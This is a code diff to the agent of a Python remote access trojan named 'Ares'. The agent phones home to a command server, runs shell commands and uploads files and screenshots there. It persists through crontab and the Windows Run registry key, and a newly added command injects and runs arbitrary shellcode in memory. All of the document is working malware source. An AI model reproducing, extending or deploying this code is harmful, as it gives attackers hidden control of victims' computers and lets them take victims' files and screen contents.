@@ -11,15 +11,13 @@ import sys
 import traceback
 import threading
 import uuid
-import StringIO
+import io
 import zipfile
 import tempfile
 import socket
 import getpass
-if os.name == 'nt':
-    from PIL import ImageGrab
-else:
-    import pyscreenshot as ImageGrab
+import mss
+import ctypes
 
 import config
 
@@ -35,7 +33,7 @@ def threaded(func):
 class Agent(object):
 
     def __init__(self):
-        self.idle = True
+        self.idle = False
         self.silent = False
         self.platform = platform.system() + " " + platform.release()
         self.last_active = time.time()
@@ -90,7 +88,8 @@ class Agent(object):
     def server_hello(self):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+                verify=config.TLS_VERIFY,
+                json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -101,9 +100,10 @@ class Agent(object):
         if not output:
             return
         if newlines:
-            output += "\n\n"
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
-        data={'output': output})
+            output += str("\n\n")
+        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
+                verify=config.TLS_VERIFY,
+                data={'output': output})
 
     def expand_path(self, path):
         """ Expand environment variables and metacharacters in a path """
@@ -116,36 +116,13 @@ class Agent(object):
             proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = proc.communicate()
             output = (out + err)
+            if os.name == "nt":
+                output = output.decode('cp850')
+            else:
+                output = output.decode('utf-8', errors='replace')
             self.send_output(output)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-
-    @threaded
-    def python(self, command_or_file):
-        """ Runs a python command or a python file and returns the output """
-        new_stdout = StringIO.StringIO()
-        old_stdout = sys.stdout
-        sys.stdout = new_stdout
-        new_stderr = StringIO.StringIO()
-        old_stderr = sys.stderr
-        sys.stderr = new_stderr
-        if os.path.exists(command_or_file):
-            self.send_output("[*] Running python file...")
-            with open(command_or_file, 'r') as f:
-                python_code = f.read()
-                try:
-                    exec(python_code)
-                except Exception as exc:
-                    self.send_output(traceback.format_exc())
-        else:
-            self.send_output("[*] Running python command...")
-            try:
-                exec(command_or_file)
-            except Exception as exc:
-                self.send_output(traceback.format_exc())
-        sys.stdout = old_stdout
-        sys.stderr = old_stderr
-        self.send_output(new_stdout.getvalue() + new_stderr.getvalue())
 
     def cd(self, directory):
         """ Change current directory """
@@ -159,6 +136,7 @@ class Agent(object):
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
                 requests.post(config.SERVER + '/api/' + self.uid + '/upload',
+                    verify=config.TLS_VERIFY,
                     files={'uploaded': open(file, 'rb')})
             else:
                 self.send_output('[!] No such file: ' + file)
@@ -197,13 +175,7 @@ class Agent(object):
             agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
             shutil.copyfile(sys.executable, agent_path)
             os.system('chmod +x ' + agent_path)
-            if os.path.exists(self.expand_path("~/.config/autostart/")):
-                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
-                with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
-                    f.write(desktop_entry)
-            else:
-                with open(self.expand_path("~/.bashrc"), "a") as f:
-                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+            os.system('(crontab -l;echo @reboot ' + agent_path + ')|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             if not os.path.exists(persist_dir):
@@ -212,6 +184,9 @@ class Agent(object):
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
+        else:
+            self.send_output('[!] Not supported.')
+            return
         self.send_output('[+] Agent installed.')
 
     def clean(self):
@@ -220,10 +195,7 @@ class Agent(object):
             persist_dir = self.expand_path('~/.ares')
             if os.path.exists(persist_dir):
                 shutil.rmtree(persist_dir)
-            desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
-            if os.path.exists(desktop_entry):
-                os.remove(desktop_entry)
-            os.system("grep -v .ares .bashrc > .bashrc.tmp;mv .bashrc.tmp .bashrc")
+            os.system('crontab -l|grep -v ' + persist_dir + '|crontab')
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
@@ -263,12 +235,35 @@ class Agent(object):
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
-        screenshot = ImageGrab.grab()
         tmp_file = tempfile.NamedTemporaryFile()
         screenshot_file = tmp_file.name + ".png"
         tmp_file.close()
-        screenshot.save(screenshot_file)
+        with mss.mss() as sct:
+            sct.shot(mon=-1, output=screenshot_file)
         self.upload(screenshot_file)
+
+    @threaded
+    def execshellcode(self, shellcode_str):
+        """ Executes given shellcode string in memory """
+        shellcode = shellcode_str.replace('\\x', '')
+        shellcode = bytes.fromhex(shellcode)
+        shellcode = bytearray(shellcode)
+        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                                  ctypes.c_int(len(shellcode)),
+                                                  ctypes.c_int(0x3000),
+                                                  ctypes.c_int(0x40))
+        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+                                             buf,
+                                             ctypes.c_int(len(shellcode)))
+        ctypes.windll.kernel32.CreateThread(
+             ctypes.c_int(0),
+             ctypes.c_int(0),
+             ctypes.c_int(ptr),
+             ctypes.c_int(0),
+             ctypes.c_int(0),
+             ctypes.pointer(ctypes.c_int(0)))
+        self.send_output("[+] Shellcode executed.")
 
     def help(self):
         """ Displays the help """
@@ -303,7 +298,7 @@ class Agent(object):
                             if not args:
                                 self.send_output('usage: cd </path/to/directory>')
                             else:
-                                self.cd(args[0])
+                                self.cd(" ".join(args))
                         elif command == 'upload':
                             if not args:
                                 self.send_output('usage: upload <localfile>')
@@ -335,6 +330,11 @@ class Agent(object):
                                 self.python(" ".join(args))
                         elif command == 'screenshot':
                             self.screenshot()
+                        elif command == 'execshellcode':
+                            if not args:
+                                self.send_output('usage: execshellcode <shellcode>')
+                            else:
+                                self.execshellcode(args[0])
                         elif command == 'help':
                             self.help()
                         else:
@@ -348,22 +348,23 @@ class Agent(object):
                         self.log("Switching to idle mode...")
                         self.idle = True
                     else:
-                        time.sleep(0.5)
+                        time.sleep(1)
             except Exception as exc:
-                self.log(traceback.format_exc())
                 failed_connections = self.get_consecutive_failed_connections()
                 failed_connections += 1
                 self.update_consecutive_failed_connections(failed_connections)
-                self.log("Consecutive failed connections: %d" % failed_connections)
+                self.log("Failed to contact %s [%s/%s]" % (config.SERVER, failed_connections, config.MAX_FAILED_CONNECTIONS))
                 if failed_connections > config.MAX_FAILED_CONNECTIONS:
                     self.silent = True
                     self.clean()
                     self.exit()
                 time.sleep(config.HELLO_INTERVAL)
 
+
 def main():
     agent = Agent()
     agent.run()
+
 
 if __name__ == "__main__":
     main()
